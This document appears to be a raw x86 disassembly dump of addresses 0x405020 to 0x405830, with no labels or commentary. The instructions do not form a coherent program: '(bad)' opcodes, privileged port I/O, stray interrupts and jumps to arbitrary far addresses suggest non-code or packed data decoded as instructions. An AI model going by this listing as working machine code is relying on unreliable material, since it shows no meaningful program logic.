  405020:	outs   dx,BYTE PTR ds:[esi]
  405021:	fcmovu st,st(4)
  405023:	cli    
  405024:	dec    esi
  405025:	mov    cl,0xac
  405027:	sub    eax,0x30066226
  40502c:	push   edi
  40502d:	sub    al,0x95
  40502f:	pop    edi
  405030:	push   es
  405031:	xchg   esi,eax
  405032:	mov    esi,0x11b372ea
  405037:	shr    DWORD PTR [ebx-0x430cd919],0x66
  40503e:	sar    dh,cl
  405040:	ss call 0x1c470277
  405046:	sbb    esi,edi
  405048:	push   esp
  405049:	fild   WORD PTR [edx+eiz*4]
  40504c:	in     eax,dx
  40504d:	in     al,0xc1
  40504f:	mov    DWORD PTR [edi-0xad6d1ed],ecx
  405055:	inc    esp
  405056:	add    bh,BYTE PTR [ecx+0x7ea17c5b]
  40505c:	in     al,dx
  40505d:	or     eax,0x1d322e6b
  405062:	push   esi
  405063:	jle    0x404fed
  405065:	jne    0x405039
  405067:	and    edi,DWORD PTR [edi]
  405069:	mov    DWORD PTR [ebp+0x16],esp
  40506c:	(bad)  
  40506d:	jmp    0x4050d2
  40506f:	mov    edi,0x71ffb5e2
  405074:	inc    eax
  405075:	sbb    ah,BYTE PTR [ecx+edx*1]
  405078:	call   FWORD PTR ds:0x7192898a
  40507e:	test   DWORD PTR [edx+0x6febdd88],edx
  405084:	call   0x592f:0x60fa1646
  40508b:	sbb    bh,BYTE PTR [edi-0x23f203df]
  405091:	add    eax,DWORD PTR [eax+0x1f84bf18]
  405097:	push   0xffffff98
  405099:	mov    ebx,esp
  40509b:	aas    
  40509c:	loop   0x4050c8
  40509e:	sbb    eax,0x1d01fc3a
  4050a3:	enter  0xebf3,0xfe
  4050a7:	call   0x1691:0x59f20da6
  4050ae:	cmp    eax,0x1a2ed8b9
  4050b3:	and    eax,0x1532b040
  4050b8:	pop    ebx
  4050b9:	or     DWORD PTR [esi-0x3d43fd08],edi
  4050bf:	mov    bl,cl
  4050c1:	repz adc edx,DWORD PTR [ebx-0x5a476361]
  4050c8:	xchg   edx,eax
  4050c9:	in     eax,dx
  4050ca:	jo     0x40505f
  4050cc:	popf   
  4050cd:	es je  0x4050aa
  4050d0:	xor    eax,0xc6652616
  4050d5:	push   cs
  4050d6:	in     al,0xa9
  4050d8:	adc    ecx,DWORD PTR [edi-0x5cf8d6a8]
  4050de:	daa    
  4050df:	cs ins DWORD PTR es:[edi],dx
  4050e1:	mov    WORD PTR [eax-0x33168875],ds
  4050e7:	test   DWORD PTR [esp+ecx*4+0x2268f4c1],esi
  4050ee:	sbb    BYTE PTR [edi-0x6],0x91
  4050f2:	mov    dh,0xd2
  4050f4:	mov    cl,0x1a
  4050f6:	or     dh,BYTE PTR [ebp+0x76]
  4050f9:	xor    DWORD PTR [ebp-0xf],ecx
  4050fc:	nop
  4050fd:	xor    al,0x3a
  4050ff:	imul   edi,eax,0xc6d2d92
  405105:	fnsave [ebx-0x14]
  405108:	mov    ecx,edi
  40510a:	mov    bh,0xe2
  40510c:	cmc    
  40510d:	scas   eax,DWORD PTR es:[edi]
  40510e:	xchg   edx,eax
  40510f:	mov    esi,0x50681f93
  405114:	inc    ebp
  405115:	inc    eax
  405116:	sar    BYTE PTR [ecx+0x4481318e],1
  40511c:	adc    ecx,DWORD PTR [edx+edx*1+0x19d82101]
  405123:	mov    al,0xec
  405125:	sub    ah,BYTE PTR ds:0x945514ae
  40512b:	sub    edx,DWORD PTR [edx+0x69]
  40512e:	daa    
  40512f:	cmp    al,0xd2
  405131:	mov    al,ds:0x5742b5a3
  405136:	mov    ds:0x37c66e60,eax
  40513b:	aas    
  40513c:	mov    esp,0x275ec34c
  405141:	mov    edi,0x815e7584
  405146:	cli    
  405147:	ret    0xf44
  40514a:	das    
  40514b:	int    0x80
  40514d:	adc    ebx,DWORD PTR [ecx]
  40514f:	and    al,0xe6
  405151:	loop   0x405189
  405153:	push   edi
  405154:	pop    eax
  405155:	mov    eax,ds:0x61a57338
  40515a:	push   0xf77ac1dc
  40515f:	int3   
  405160:	push   edi
  405161:	jo     0x405196
  405163:	arpl   WORD PTR [esi],sp
  405165:	add    eax,0x400988b
  40516a:	and    eax,DWORD PTR [ebp-0x129c944d]
  405170:	pop    esi
  405171:	mov    edx,0x791dfea8
  405176:	imul   ecx,DWORD PTR [edi+0x42b8a9ab],0x2f
  40517d:	loop   0x40513a
  40517f:	sbb    eax,0x1d2e7404
  405184:	adc    eax,0xd32e64b1
  405189:	adc    BYTE PTR [edx-0x23],dh
  40518c:	lock mov ds:0x31d454fc,eax
  405192:	(bad)  
  405193:	hlt    
  405194:	mov    ds:0x526e5396,al
  405199:	and    ebp,esp
  40519b:	repz dec edx
  40519d:	sbb    esi,esp
  40519f:	out    0x19,al
  4051a1:	mov    DWORD PTR [eax+0xc],edi
  4051a4:	daa    
  4051a5:	xchg   ebp,eax
  4051a6:	retf   
  4051a7:	int    0xd
  4051a9:	int    0x14
  4051ab:	sub    al,0x52
  4051ad:	ins    DWORD PTR es:[edi],dx
  4051ae:	sbb    esp,ebp
  4051b0:	adc    DWORD PTR [esi-0xe],esi
  4051b3:	cmp    DWORD PTR [ebp-0x1064d54c],0xa3da9f4a
  4051bd:	std    
  4051be:	add    DWORD PTR [ebx+0x5862e8cd],eax
  4051c4:	xor    al,BYTE PTR [ebx+eax*8-0x42d415f8]
  4051cb:	and    BYTE PTR [esi-0x31],0x82
  4051cf:	cmp    DWORD PTR ds:0xecf47d26,esi
  4051d5:	jmp    0x4051fd
  4051d7:	nop
  4051d8:	inc    edx
  4051d9:	loop   0x4051e1
  4051db:	add    edi,edx
  4051dd:	mov    ds:0x5d9d7780,eax
  4051e2:	(bad)  
  4051e3:	push   edi
  4051e4:	sub    ch,dl
  4051e6:	fidivr WORD PTR [ebp-0x4d]
  4051e9:	pop    ebp
  4051ea:	pusha  
  4051eb:	clc    
  4051ec:	lods   al,BYTE PTR ds:[esi]
  4051ed:	pop    ecx
  4051ee:	cld    
  4051ef:	pop    ss
  4051f0:	mov    dh,0x45
  4051f2:	mov    dl,0x8
  4051f4:	sub    esi,ecx
  4051f6:	add    dl,BYTE PTR [ebx]
  4051f8:	call   0x94a3:0x8d733b66
  4051ff:	add    ecx,ebp
  405201:	push   es
  405202:	int    0xc2
  405204:	jl     0x405207
  405206:	mov    ch,0x8d
  405208:	cwde   
  405209:	imul   eax,DWORD PTR [edi+0x24a0691e],0xa77c4733
  405213:	loope  0x40523b
  405215:	push   esp
  405216:	aad    0x59
  405218:	adc    edx,DWORD PTR [edx+0x7d]
  40521b:	mov    ecx,0x29b45ecb
  405220:	sbb    eax,0xbeb5ba9d
  405225:	rol    BYTE PTR [eax+0x545e8d2e],1
  40522b:	(bad)  
  40522c:	jmp    0x4052ab
  40522e:	sub    esp,DWORD PTR [ebx+0x72]
  405231:	jnp    0x405291
  405233:	or     ch,BYTE PTR [esi+edx*2-0x5bd2f978]
  40523a:	jmp    0x3b94:0xd5735e50
  405241:	pop    ebx
  405242:	clc    
  405243:	jae    0x405285
  405245:	xor    bh,BYTE PTR [edi-0x44]
  405248:	mov    cl,0x8f
  40524a:	mov    ah,0x3f
  40524c:	dec    esi
  40524d:	mov    eax,ds:0x614680ec
  405252:	inc    esi
  405253:	xchg   edi,eax
  405254:	sbb    DWORD PTR [ecx+0x1b],ebx
  405257:	or     esi,DWORD PTR [ebp-0x20]
  40525a:	outs   dx,BYTE PTR ds:[esi]
  40525b:	ins    DWORD PTR es:[edi],dx
  40525c:	loop   0x40529f
  40525e:	fdivp  st(1),st
  405260:	xor    al,0xbe
  405262:	pop    eax
  405263:	and    eax,0x245c61f
  405268:	mov    DWORD PTR [edi],0x6c7a4c1f
  40526e:	sbb    esi,DWORD PTR [eax+0x44]
  405271:	push   ebp
  405272:	jg     0x4052a5
  405274:	shl    BYTE PTR gs:[ecx-0x5d],0x8d
  405279:	xor    al,ch
  40527b:	xor    al,0x8e
  40527d:	std    
  40527e:	push   edi
  40527f:	mov    al,ds:0x58be4184
  405284:	daa    
  405285:	(bad)  
  405287:	inc    ebp
  405288:	xchg   ebp,eax
  405289:	mov    ds:0xa8a1a684,eax
  40528e:	psubusw mm0,QWORD PTR ds:0xf4a0d59a
  405295:	repz clc 
  405297:	sbb    eax,0x292f810b
  40529c:	jns    0x405299
  40529e:	xchg   ebp,eax
  40529f:	lahf   
  4052a0:	push   esp
  4052a1:	ficom  WORD PTR [eax+0x67490bcc]
  4052a7:	mov    edi,0xe796a4a4
  4052ac:	push   esp
  4052ad:	les    esp,FWORD PTR [edi]
  4052af:	or     eax,DWORD PTR [ebp+0x51200b30]
  4052b5:	jg     0x405301
  4052b7:	hlt    
  4052b8:	mov    ebx,0x26bc4b9d
  4052bd:	push   cs
  4052be:	jno    0x40525b
  4052c0:	push   0xffffffe9
  4052c2:	in     al,dx
  4052c3:	push   ss
  4052c4:	imul   ecx,DWORD PTR [esi],0xfffffff8
  4052c7:	sbb    esi,edx
  4052c9:	inc    esp
  4052ca:	jae    0x4052ca
  4052cc:	xchg   edx,eax
  4052cd:	shl    cl,0xee
  4052d0:	imul   eax,DWORD PTR [edi+0x40],0x28
  4052d4:	or     bh,BYTE PTR [edi+eax*4+0x7fcdbdac]
  4052db:	adc    al,0x7
  4052dd:	sub    eax,0xae264438
  4052e2:	adc    BYTE PTR [ebx+0x7a7fdf82],0x8c
  4052e9:	bnd call 0x563af8c9
  4052ef:	inc    ebp
  4052f0:	shr    DWORD PTR [esi],0xee
  4052f3:	inc    ecx
  4052f4:	pusha  
  4052f5:	adc    eax,0xddbc33f5
  4052fa:	mov    al,BYTE PTR [ebx+0x289eb6dc]
  405300:	xor    al,0x2e
  405302:	stos   DWORD PTR es:[edi],eax
  405303:	les    ebp,FWORD PTR [esi-0x2b]
  405306:	mov    ds:0x92f0b079,al
  40530b:	stc    
  40530c:	loope  0x405308
  40530e:	xchg   ebp,eax
  40530f:	data16 add al,0xb4
  405312:	cmp    eax,0x3642e2c4
  405317:	pop    esp
  405318:	jmp    0x5328:0xb88a6b86
  40531f:	int    0xb5
  405321:	push   esi
  405322:	cmp    DWORD PTR [ecx],0xfffffff8
  405325:	and    al,0x0
  405327:	xchg   edx,eax
  405328:	sub    ebx,esi
  40532a:	sbb    BYTE PTR [ebx],0xa0
  40532d:	shl    DWORD PTR [ebp-0x6f69bb17],1
  405333:	push   ecx
  405334:	sbb    al,BYTE PTR [eax]
  405336:	ins    BYTE PTR es:[edi],dx
  405337:	aam    0xa
  405339:	in     eax,dx
  40533a:	pop    es
  40533b:	jo     0x4052fa
  40533d:	mov    BYTE PTR [ebx],cl
  40533f:	(bad)  
  405340:	lock add dl,BYTE PTR [esi-0x1ed53ed8]
  405347:	les    esi,FWORD PTR [edi+eax*4-0x5d04896d]
  40534e:	inc    edi
  40534f:	mov    edi,0x86153c56
  405354:	pop    ecx
  405355:	mov    bh,0x9e
  405357:	inc    eax
  405358:	or     ecx,ecx
  40535a:	jbe    0x40536c
  40535c:	imul   esi,DWORD PTR [ebx+ebx*8],0xffffff9f
  405360:	mov    WORD PTR [esi+0x3529acdd],ss
  405366:	outs   dx,BYTE PTR ds:[esi]
  405367:	test   DWORD PTR [edx],edi
  405369:	mul    bl
  40536b:	pop    edx
  40536c:	in     al,dx
  40536d:	adc    eax,0x797835d7
  405372:	and    eax,edx
  405374:	xor    eax,0x40609a19
  405379:	jbe    0x405328
  40537b:	xchg   esp,eax
  40537c:	out    0xff,eax
  40537e:	test   eax,0xda4382d9
  405383:	xchg   DWORD PTR [ecx+0x4f490fe7],edx
  405389:	adc    cl,BYTE PTR [esi+0x181574e9]
  40538f:	mov    eax,0x53cd0bcc
  405394:	enter  0x2c77,0xfe
  405398:	aaa    
  405399:	push   eax
  40539a:	loop   0x4053f7
  40539c:	mov    esp,0x25ed2bc8
  4053a1:	jmp    DWORD PTR [edx-0x42367247]
  4053a7:	retf   
  4053a8:	push   ecx
  4053a9:	rcr    BYTE PTR [edi+ebp*8-0x5c],0x76
  4053ae:	std    
  4053af:	dec    BYTE PTR [edi-0x32973bac]
  4053b5:	aas    
  4053b6:	stos   BYTE PTR es:[edi],al
  4053b7:	ret    
  4053b8:	push   ss
  4053b9:	xchg   ebx,eax
  4053ba:	and    al,0xdf
  4053bc:	call   DWORD PTR [ebx+0x5b]
  4053bf:	outs   dx,DWORD PTR ds:[esi]
  4053c0:	(bad)  
  4053c1:	mov    gs,WORD PTR [eax]
  4053c3:	rcr    DWORD PTR [edx+0xb1b1d80],1
  4053c9:	aad    0x7a
  4053cb:	jl     0x4053da
  4053cd:	pop    ebp
  4053ce:	dec    edi
  4053cf:	cmp    cl,BYTE PTR [edx]
  4053d1:	xor    al,BYTE PTR [edi]
  4053d3:	xor    esi,edx
  4053d5:	mov    edx,0x22903e53
  4053da:	in     al,dx
  4053db:	out    0x8,eax
  4053dd:	cwde   
  4053de:	cli    
  4053df:	rol    bh,1
  4053e1:	dec    ecx
  4053e2:	pop    esp
  4053e3:	psubd  mm2,QWORD PTR [ebp-0x74d70de5]
  4053ea:	in     eax,0x4d
  4053ec:	push   ecx
  4053ed:	cmp    edx,DWORD PTR [eax]
  4053ef:	shl    dh,1
  4053f1:	pop    ebp
  4053f2:	or     ecx,edx
  4053f4:	and    al,dh
  4053f6:	les    esp,FWORD PTR [ecx-0xe6a0960]
  4053fc:	xchg   BYTE PTR [ebp-0x59],bh
  4053ff:	mov    eax,0x6f348a9f
  405404:	or     ebx,DWORD PTR [ebp-0x39]
  405407:	pushf  
  405408:	std    
  405409:	shr    DWORD PTR [eax+0x6701a53b],cl
  40540f:	lods   eax,DWORD PTR ds:[esi]
  405410:	or     al,0x42
  405412:	push   edi
  405413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405414:	mov    BYTE PTR [ebp+0x69],bh
  405417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405418:	adc    DWORD PTR [esi],esi
  40541a:	xlat   BYTE PTR ds:[ebx]
  40541b:	out    dx,al
  40541c:	fnstcw WORD PTR [edi-0x77]
  40541f:	arpl   WORD PTR [esi+0x9],sp
  405422:	(bad)  
  405423:	or     al,0xc5
  405425:	mov    dh,0x24
  405427:	ds das 
  405429:	lock adc eax,0xc0702046
  40542f:	retf   0x155b
  405432:	adc    cl,bh
  405434:	clc    
  405435:	out    0x93,eax
  405437:	outs   dx,BYTE PTR ds:[esi]
  405438:	sub    ebx,esi
  40543a:	fbstp  TBYTE PTR [esi-0x43]
  40543d:	mov    ch,0x40
  40543f:	and    edi,eax
  405441:	jmp    FWORD PTR [ecx+0x29fa8cc3]
  405447:	pop    ebx
  405448:	cmp    dl,BYTE PTR fs:[esi]
  40544b:	fmul   DWORD PTR [ebp+0x16]
  40544e:	(bad)  
  40544f:	sub    dh,BYTE PTR [eax+0x52]
  405452:	mov    ah,0xeb
  405454:	jns    0x4053d8
  405456:	jle    0x4053fe
  405458:	adc    eax,0xaa5c6a39
  40545d:	sbb    DWORD PTR [edi],esi
  40545f:	and    eax,ecx
  405461:	pusha  
  405462:	xor    eax,0x94f57e6
  405467:	add    eax,0xb3b71d88
  40546c:	pop    esp
  40546d:	adc    ebp,esp
  40546f:	jge    0x405433
  405471:	data16 lods al,BYTE PTR ds:[esi]
  405473:	sbb    BYTE PTR [ebp+0x78],bl
  405476:	xchg   ecx,eax
  405477:	sbb    eax,0x18993348
  40547c:	dec    ebp
  40547d:	pop    ecx
  40547e:	lods   al,BYTE PTR ds:[esi]
  40547f:	cmp    DWORD PTR [edx+0x74],0x5d0f9117
  405486:	(bad)  
  405488:	adc    al,0x9a
  40548a:	fidivr DWORD PTR [ebx]
  40548c:	push   cs
  40548d:	cmp    BYTE PTR [eax-0x76930dd7],cl
  405493:	xchg   esp,eax
  405494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405495:	mov    ebx,0xe1540c76
  40549a:	dec    esi
  40549b:	(bad)  
  40549c:	mov    ecx,0x6fa46f02
  4054a1:	jnp    0x4054a4
  4054a3:	mov    DWORD PTR [esi+0x186a7337],ebp
  4054a9:	(bad)  
  4054aa:	les    ecx,FWORD PTR [eax+0x27]
  4054ad:	inc    ebx
  4054ae:	pop    ss
  4054af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054b1:	push   ecx
  4054b2:	add    eax,edx
  4054b4:	dec    eax
  4054b5:	dec    esi
  4054b6:	and    BYTE PTR [eax-0x7a9198c4],cl
  4054bc:	std    
  4054bd:	lods   al,BYTE PTR ds:[esi]
  4054be:	cmp    eax,0xea62c35
  4054c3:	mov    eax,0x3dd24b86
  4054c8:	jne    0x405536
  4054ca:	mov    al,ds:0xfca2d73c
  4054cf:	push   0xffffffd6
  4054d1:	test   bl,bl
  4054d3:	mov    edi,0x3d3c0d57
  4054d8:	add    ebx,DWORD PTR [ebp-0x3b]
  4054db:	cmc    
  4054dc:	jecxz  0x405526
  4054de:	ret    
  4054df:	mov    esi,0x2e3b5c3d
  4054e4:	mov    ch,dh
  4054e6:	or     al,0x25
  4054e8:	fwait
  4054e9:	cs mov ecx,0xc65e2e52
  4054ef:	push   eax
  4054f0:	inc    edx
  4054f1:	aaa    
  4054f2:	retf   0x7c83
  4054f5:	or     BYTE PTR [eax-0x7ecb76a2],0x5e
  4054fc:	adc    eax,DWORD PTR [eax]
  4054fe:	loopne 0x4054ab
  405500:	jmp    0x40554c
  405502:	jge    0x40549e
  405504:	jmp    0x692fa6ee
  405509:	pushf  
  40550a:	inc    esp
  40550b:	push   ecx
  40550c:	jmp    0x2f34:0x95f256fb
  405513:	cmp    bh,al
  405515:	in     al,0x29
  405517:	(bad)  
  405518:	ficomp DWORD PTR [ebp-0x10]
  40551b:	lods   al,BYTE PTR ds:[esi]
  40551c:	pop    ecx
  40551d:	test   BYTE PTR [edx],ch
  40551f:	addr16 ret 
  405521:	add    al,0xf4
  405523:	add    ch,bl
  405525:	and    eax,0x754ca677
  40552a:	dec    DWORD PTR [ebx-0x44773a3c]
  405530:	out    dx,eax
  405531:	scas   al,BYTE PTR es:[edi]
  405532:	mov    cl,0x76
  405534:	sub    eax,0xdab5a72c
  405539:	stos   BYTE PTR es:[edi],al
  40553a:	sub    BYTE PTR [edx+0x2b],ch
  40553d:	lea    ecx,[ebp+0x1e64d578]
  405543:	mov    dh,0x7d
  405545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405546:	inc    ecx
  405547:	call   0x5bfb:0x90f82c24
  40554e:	pop    edx
  40554f:	dec    ebx
  405550:	sub    DWORD PTR [ecx],edx
  405552:	inc    edi
  405553:	fwait
  405554:	int    0x66
  405556:	cmc    
  405557:	ret    0xe199
  40555a:	pop    ebx
  40555b:	cmp    BYTE PTR [ecx+esi*1-0x7094f060],0x8c
  405563:	int3   
  405564:	inc    edx
  405565:	sbb    al,BYTE PTR [ebx]
  405567:	mov    ecx,0x5bcf3fce
  40556c:	or     al,0x89
  40556e:	(bad)  
  40556f:	fistp  QWORD PTR [esi-0x756b0480]
  405575:	mov    bh,0x5b
  405577:	ins    DWORD PTR es:[edi],dx
  405578:	jno    0x4055f2
  40557a:	(bad)  
  40557b:	xchg   ebp,eax
  40557c:	dec    ebp
  40557d:	jmp    0xfea890ec
  405582:	outs   dx,DWORD PTR ds:[esi]
  405583:	fimul  DWORD PTR [eax-0x8]
  405586:	inc    esp
  405587:	(bad)  
  405588:	mov    eax,ds:0x9c089303
  40558d:	arpl   WORD PTR [edi],bp
  40558f:	adc    eax,0xc10a585e
  405594:	mov    esi,0x9a680e85
  405599:	dec    esp
  40559a:	jp     0x40552f
  40559c:	push   cs
  40559d:	push   0xf60e3c4c
  4055a2:	popf   
  4055a3:	jno    0x4055d4
  4055a5:	cwde   
  4055a6:	bound  ecx,QWORD PTR [eax-0x3d]
  4055a9:	push   DWORD PTR [ebp+0x32bb338e]
  4055af:	das    
  4055b0:	(bad)  
  4055b1:	push   cs
  4055b2:	fwait
  4055b3:	mov    ah,0x19
  4055b5:	icebp  
  4055b6:	pop    ecx
  4055b7:	cli    
  4055b8:	rol    esp,1
  4055ba:	xor    al,0xfd
  4055bc:	popf   
  4055bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055be:	das    
  4055bf:	sbb    esp,DWORD PTR [edx-0x38b26f36]
  4055c5:	sub    BYTE PTR [ebp+0x72be06ad],bl
  4055cb:	jge    0x4055da
  4055cd:	les    esp,FWORD PTR [edx]
  4055cf:	rol    edi,cl
  4055d1:	mov    bh,cl
  4055d3:	out    dx,al
  4055d4:	dec    esp
  4055d5:	sbb    esi,DWORD PTR [esi+0x2a1b44cc]
  4055db:	jo     0x405601
  4055dd:	mov    edi,0x576fb4f8
  4055e2:	or     al,BYTE PTR [edi+0x71]
  4055e5:	sbb    DWORD PTR [ecx+esi*4+0x1d68a025],ebp
  4055ec:	xor    DWORD PTR [edi-0x2c],edx
  4055ef:	jg     0x4055b0
  4055f1:	xchg   BYTE PTR [esi],ah
  4055f3:	jne    0x405633
  4055f5:	add    BYTE PTR [eax],cl
  4055f7:	push   edi
  4055f8:	les    esp,FWORD PTR [edx-0x33]
  4055fb:	int3   
  4055fc:	sbb    BYTE PTR [ecx-0x5],dh
  4055ff:	sbb    DWORD PTR [ecx],ebx
  405601:	scas   al,BYTE PTR es:[edi]
  405602:	mov    esi,0xa6e54be2
  405607:	(bad)  
  405608:	jns    0x40558b
  40560a:	jmp    0x1b91:0x385a0825
  405611:	and    BYTE PTR [ebx],bh
  405613:	and    eax,0x186bec87
  405618:	daa    
  405619:	sbb    eax,0x7a7e0fa2
  40561e:	push   edx
  40561f:	not    DWORD PTR [edi]
  405621:	fild   WORD PTR [edi+0x58735432]
  405627:	in     eax,dx
  405628:	and    BYTE PTR es:[edi-0x83609c1],dh
  40562f:	jle    0x405601
  405631:	outs   dx,DWORD PTR ds:[esi]
  405632:	sbb    DWORD PTR [ebp-0x6b99da31],eax
  405638:	mov    bl,0xdb
  40563a:	sbb    eax,DWORD PTR [eax+0xe]
  40563d:	dec    ebp
  40563e:	mov    eax,0xb4418694
  405643:	push   ebx
  405644:	and    eax,DWORD PTR [edx+0x5e]
  405647:	pop    eax
  405648:	xor    BYTE PTR [edx+esi*8-0x6a],ch
  40564c:	loopne 0x4056b5
  40564e:	jp     0x7dd7bb63
  405654:	fcomip st,st(2)
  405656:	call   0xebafe88a
  40565b:	mov    eax,ds:0xcdf4c2f8
  405660:	fwait
  405661:	outs   dx,DWORD PTR ds:[esi]
  405662:	int    0x87
  405664:	or     dl,BYTE PTR [edx]
  405666:	mov    ah,0x5a
  405668:	jmp    FWORD PTR [esi-0x66d307b3]
  40566e:	rol    ch,1
  405670:	nop
  405671:	test   al,0xc4
  405673:	test   BYTE PTR [esi],al
  405675:	arpl   WORD PTR [esi-0x1d],si
  405678:	div    BYTE PTR [ebp+0x32]
  40567b:	cmp    bl,bh
  40567d:	push   ecx
  40567e:	cmp    bl,BYTE PTR [edi+0x3b]
  405681:	jmp    0x4056c9
  405683:	fs sub esi,esp
  405686:	adc    al,0x1e
  405688:	stos   DWORD PTR es:[edi],eax
  405689:	xor    al,BYTE PTR ds:0x25483ea1
  40568f:	xor    BYTE PTR [ebp-0x50],dh
  405692:	into   
  405693:	push   0xdbc54374
  405698:	push   ss
  405699:	sub    al,0xfc
  40569b:	enter  0x2db7,0x9c
  40569f:	sub    eax,0x6ab1b12b
  4056a4:	push   ss
  4056a5:	div    BYTE PTR [ecx+0x3b]
  4056a8:	mov    edx,0xd5a3adb1
  4056ad:	jae    0x40572c
  4056af:	add    DWORD PTR [ebp-0x7b11af18],edi
  4056b5:	sbb    ebx,edx
  4056b7:	cdq    
  4056b8:	dec    ecx
  4056b9:	mov    esi,fs
  4056bb:	retf   
  4056bc:	imul   ecx,DWORD PTR [edx],0x69
  4056bf:	mov    al,ds:0x61f2fb03
  4056c4:	out    0x77,eax
  4056c6:	or     bh,BYTE PTR [edx+0x3]
  4056c9:	fcmove st,st(2)
  4056cb:	hlt    
  4056cc:	push   esi
  4056cd:	das    
  4056ce:	or     al,0xd3
  4056d0:	mov    al,cl
  4056d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d3:	ja     0x405753
  4056d5:	sub    eax,0xccca475e
  4056da:	les    ebx,FWORD PTR [ecx-0x3b]
  4056dd:	mov    cl,0x1b
  4056df:	xor    BYTE PTR [ecx-0x5118535f],dl
  4056e5:	cmp    eax,0x4f8bbb37
  4056ea:	retf   
  4056eb:	pop    ss
  4056ec:	pusha  
  4056ed:	cmovns ebx,DWORD PTR [esi]
  4056f0:	push   esi
  4056f1:	cmp    eax,0xdd29e4c6
  4056f6:	ss fwait
  4056f8:	dec    ecx
  4056f9:	dec    esp
  4056fa:	mov    BYTE PTR [ecx-0x24724e7d],al
  405700:	ds fs fucomi st,st(0)
  405704:	(bad)  
  405706:	repnz lock push esi
  405709:	push   es
  40570a:	xor    eax,0x1b57014
  40570f:	pop    edi
  405710:	dec    esp
  405711:	or     eax,0xa5b1d2f8
  405716:	adc    eax,0x63e26cc8
  40571b:	xor    esi,DWORD PTR [esi+0x19]
  40571e:	inc    eax
  40571f:	push   ss
  405720:	call   0xae40f6ca
  405725:	mov    al,0x5c
  405727:	sbb    al,0x5e
  405729:	inc    esp
  40572a:	sbb    DWORD PTR [eax-0xb],0x7c
  40572e:	xor    ah,BYTE PTR [ebp+0x58]
  405731:	mov    dh,0x61
  405733:	sub    DWORD PTR [ebx],ebp
  405735:	or     eax,0x9cc504d2
  40573a:	in     al,dx
  40573b:	int    0x5
  40573d:	mov    ecx,0x8c1ee448
  405742:	fsub   QWORD PTR [esi-0x7f]
  405745:	sbb    eax,0x11957cd7
  40574a:	out    0xf0,al
  40574c:	ret    
  40574d:	aaa    
  40574e:	sub    al,0xb3
  405750:	xor    al,0xdd
  405752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405753:	shl    BYTE PTR [ebp-0x49],0xf7
  405757:	ja     0x4057c2
  405759:	shl    DWORD PTR [edi-0x7f],0x5a
  40575d:	cwde   
  40575e:	xchg   DWORD PTR [ecx],ecx
  405760:	mov    ds:0x7d70cb73,eax
  405765:	cmc    
  405766:	mov    DWORD PTR [eax],ebx
  405768:	push   cs
  405769:	imul   edx,DWORD PTR [eax],0xffffffea
  40576c:	cwde   
  40576d:	xlat   BYTE PTR ds:[ebx]
  40576e:	xchg   esp,eax
  40576f:	ja     0x405712
  405771:	adc    BYTE PTR [edi],cl
  405773:	jbe    0x4057d4
  405775:	push   ebp
  405776:	popf   
  405777:	lods   eax,DWORD PTR ds:[esi]
  405778:	rcl    DWORD PTR [eax-0x11],1
  40577b:	add    al,BYTE PTR [edx-0x54]
  40577e:	out    0x9f,al
  405780:	sub    al,0x9d
  405782:	sbb    esi,DWORD PTR [edx+0x78fd72df]
  405788:	ins    BYTE PTR es:[edi],dx
  405789:	sub    esi,ecx
  40578b:	fsubr  DWORD PTR [esi]
  40578d:	iret   
  40578e:	inc    ebx
  40578f:	xlat   BYTE PTR ds:[ebx]
  405790:	mov    eax,0x141f6711
  405795:	add    eax,0x24639f8d
  40579a:	jp     0x40573a
  40579c:	stos   BYTE PTR es:[edi],al
  40579d:	out    0x55,eax
  40579f:	fistp  QWORD PTR [esi]
  4057a1:	cmp    DWORD PTR [edx],ebp
  4057a3:	xchg   ecx,eax
  4057a4:	cdq    
  4057a5:	push   esp
  4057a6:	sbb    eax,0xf7dfe961
  4057ab:	and    BYTE PTR [eax-0x6],bh
  4057ae:	ins    BYTE PTR es:[edi],dx
  4057af:	loopne 0x4057b7
  4057b1:	push   ebx
  4057b2:	imul   esi,ebp,0x38
  4057b5:	push   edi
  4057b6:	mov    esi,0xa31519b5
  4057bb:	cmp    eax,0x79c6d06e
  4057c0:	add    edi,DWORD PTR [esi+0x7ed34d64]
  4057c6:	stos   DWORD PTR es:[edi],eax
  4057c7:	popf   
  4057c8:	jo     0x4057c2
  4057ca:	mov    esp,0x955708aa
  4057cf:	addr16 in eax,dx
  4057d1:	sti    
  4057d2:	int3   
  4057d3:	lock sub BYTE PTR [eax+eax*8],cl
  4057d7:	loope  0x4057d0
  4057d9:	fsubr  QWORD PTR [edx+0x3c]
  4057dc:	sbb    al,0x80
  4057de:	push   ebp
  4057df:	push   esp
  4057e0:	popa   
  4057e1:	adc    ecx,DWORD PTR [eax-0x440da612]
  4057e7:	aam    0xb2
  4057e9:	stc    
  4057ea:	test   DWORD PTR [ebp+0x68],ebp
  4057ed:	fadd   QWORD PTR [ecx]
  4057ef:	(bad)  
  4057f0:	jnp    0x40583e
  4057f2:	pop    ebx
  4057f3:	sbb    DWORD PTR [edi-0x6319e65a],0xffffffcb
  4057fa:	(bad)  
  4057fb:	rcl    BYTE PTR [eax],0xcd
  4057fe:	xchg   esi,eax
  4057ff:	dec    edx
  405800:	cdq    
  405801:	jne    0x40581a
  405803:	pushf  
  405804:	not    BYTE PTR [ecx+0x6f]
  405807:	(bad)  
  405808:	cmp    ecx,DWORD PTR [esi+0x2e97e633]
  40580e:	aam    0x89
  405810:	ins    DWORD PTR es:[edi],dx
  405811:	or     esi,DWORD PTR [ecx+0x29]
  405814:	iret   
  405815:	xchg   ecx,eax
  405816:	sbb    al,0xd4
  405818:	test   ch,0x24
  40581b:	test   al,0x45
  40581d:	pop    ecx
  40581e:	retf   0x4747
  405821:	(bad)  
  405822:	bound  edx,QWORD PTR [esi]
  405824:	lock jge 0x40586f
  405827:	stos   BYTE PTR es:[edi],al
  405828:	push   edx
  405829:	fist   WORD PTR [ebp+0x4a]
  40582c:	jmp    0x40588d
  40582e:	mov    ah,0xdf
  405830:	rcl    bl,0x82
